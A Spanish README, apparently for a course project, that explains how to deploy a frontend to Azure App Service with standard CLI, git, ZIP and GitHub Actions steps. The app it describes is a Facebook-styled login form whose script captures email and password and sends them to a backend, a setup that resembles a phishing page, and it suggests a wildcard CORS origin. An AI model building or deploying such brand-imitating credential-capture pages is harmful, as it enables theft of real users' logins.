# Azure App Service - Frontend Deployment Guide

Este proyecto es una aplicación frontend que se desplegará en Azure App Service usando PHP como contenedor para servir archivos estáticos.

## 📋 Estructura del Proyecto

```
Parcial2_frontend/
├── index.html          # Página principal (formulario de login)
├── index.php           # Punto de entrada para Azure App Service
├── styles.css          # Estilos CSS
├── script.js           # JavaScript para captura y envío de datos
├── composer.json       # Configuración PHP para Azure
├── .deployment         # Configuración de despliegue Azure
└── deploy.sh           # Script de despliegue
```

## 🚀 Características

- **Formulario de Login**: Interfaz estilo Facebook
- **Captura de Datos**: JavaScript captura email y password
- **HTTP POST**: Envío de datos al backend mediante Fetch API
- **Validación**: Validación de campos en el cliente
- **Azure Ready**: Configurado para despliegue en Azure App Service

## 🔧 Configuración del Backend

Antes de desplegar, actualiza la URL del backend en `script.js`:

```javascript
const BACKEND_URL = 'https://tu-backend.azurewebsites.net/api/login';
```

## 📦 Despliegue en Azure App Service

### Opción 1: Despliegue desde Azure Portal

1. **Crear Resource Group** (si no existe):
   ```bash
   az group create --name mi-resource-group --location eastus
   ```

2. **Crear App Service Plan**:
   ```bash
   az appservice plan create --name mi-app-plan --resource-group mi-resource-group --sku B1 --is-linux
   ```

3. **Crear Web App con PHP**:
   ```bash
   az webapp create --resource-group mi-resource-group --plan mi-app-plan --name mi-frontend-app --runtime "PHP:8.0"
   ```

4. **Configurar despliegue local Git**:
   ```bash
   az webapp deployment source config-local-git --name mi-frontend-app --resource-group mi-resource-group
   ```

5. **Obtener credenciales de despliegue**:
   ```bash
   az webapp deployment list-publishing-credentials --name mi-frontend-app --resource-group mi-resource-group
   ```

6. **Desplegar usando Git**:
   ```bash
   # Inicializar repositorio (si no existe)
   git init
   git add .
   git commit -m "Initial commit"
   
   # Agregar remote de Azure
   git remote add azure https://<deployment-username>@<app-name>.scm.azurewebsites.net/<app-name>.git
   
   # Push a Azure
   git push azure master
   ```

### Opción 2: Despliegue desde VS Code

1. **Instalar extensión**: Azure App Service para VS Code

2. **Pasos**:
   - Abrir Command Palette (Ctrl+Shift+P)
   - Buscar "Azure App Service: Deploy to Web App"
   - Seleccionar la carpeta del proyecto
   - Crear nuevo Web App o seleccionar existente
   - Elegir "PHP 8.0" como runtime
   - Confirmar despliegue

### Opción 3: Despliegue con ZIP

1. **Crear archivo ZIP**:
   ```powershell
   Compress-Archive -Path * -DestinationPath deploy.zip
   ```

2. **Desplegar ZIP**:
   ```bash
   az webapp deployment source config-zip --resource-group mi-resource-group --name mi-frontend-app --src deploy.zip
   ```

### Opción 4: GitHub Actions (CI/CD)

1. **Configurar GitHub Actions** en el portal de Azure:
   - Ve a tu Web App → Deployment Center
   - Selecciona GitHub como fuente
   - Autoriza y selecciona tu repositorio
   - Azure creará automáticamente el workflow

2. **Workflow generado** (`.github/workflows/azure-webapps-php.yml`):
   ```yaml
   name: Build and deploy PHP app to Azure

   on:
     push:
       branches:
         - main

   jobs:
     build:
       runs-on: ubuntu-latest
       steps:
         - uses: actions/checkout@v2
         - name: Setup PHP
           uses: shivammathur/setup-php@v2
           with:
             php-version: '8.0'
         - name: Deploy to Azure Web App
           uses: azure/webapps-deploy@v2
           with:
             app-name: 'mi-frontend-app'
             publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}
   ```

## ⚙️ Configuración de Azure App Service

### Configurar Variables de Entorno (Opcional)

```bash
az webapp config appsettings set --name mi-frontend-app --resource-group mi-resource-group --settings BACKEND_URL="https://tu-backend.azurewebsites.net"
```

### Habilitar CORS (si es necesario)

```bash
az webapp cors add --name mi-frontend-app --resource-group mi-resource-group --allowed-origins "*"
```

### Configurar dominio personalizado

1. En Azure Portal → App Service → Custom domains
2. Agregar dominio personalizado
3. Configurar DNS según instrucciones

### Habilitar HTTPS

```bash
az webapp update --name mi-frontend-app --resource-group mi-resource-group --https-only true
```

## 🔍 Verificación del Despliegue

1. **URL de la aplicación**:
   ```
   https://mi-frontend-app.azurewebsites.net
   ```

2. **Verificar logs**:
   ```bash
   az webapp log tail --name mi-frontend-app --resource-group mi-resource-group
   ```

3. **Abrir en navegador**:
   ```bash
   az webapp browse --name mi-frontend-app --resource-group mi-resource-group
   ```

## 🐛 Troubleshooting

### Error 403/404
- Verificar que `index.php` existe en la raíz
- Revisar permisos de archivos

### JavaScript no se ejecuta
- Verificar que `script.js` se carga correctamente
- Revisar console del navegador (F12)
- Verificar CORS si el backend está en otro dominio

### Backend no responde
- Verificar que `BACKEND_URL` en `script.js` es correcta
- Verificar que el backend acepta CORS
- Revisar logs del navegador (Network tab)

## 📝 Notas Importantes

1. **PHP como Contenedor**: PHP solo sirve archivos estáticos, no procesa lógica backend
2. **CORS**: Asegúrate que tu backend permite requests desde tu dominio Azure
3. **HTTPS**: Azure proporciona certificado SSL gratuito
4. **Costos**: Plan B1 es de bajo costo, hay tier gratuito (F1) disponible

## 🔒 Seguridad

- Nunca commits credenciales en el código
- Usa variables de entorno para configuración
- Habilita HTTPS en producción
- Implementa rate limiting en el backend

## 📚 Recursos Adicionales

- [Azure App Service Documentation](https://docs.microsoft.com/azure/app-service/)
- [Azure CLI Reference](https://docs.microsoft.com/cli/azure/)
- [Deployment Best Practices](https://docs.microsoft.com/azure/app-service/deploy-best-practices)

## 🎯 Próximos Pasos

1. Actualizar `BACKEND_URL` en `script.js`
2. Crear cuenta de Azure (crédito gratuito disponible)
3. Instalar Azure CLI
4. Seguir los pasos de despliegue
5. Configurar dominio personalizado (opcional)
6. Configurar CI/CD con GitHub Actions (recomendado)

---

**¡Tu aplicación estará lista en minutos!** 🚀
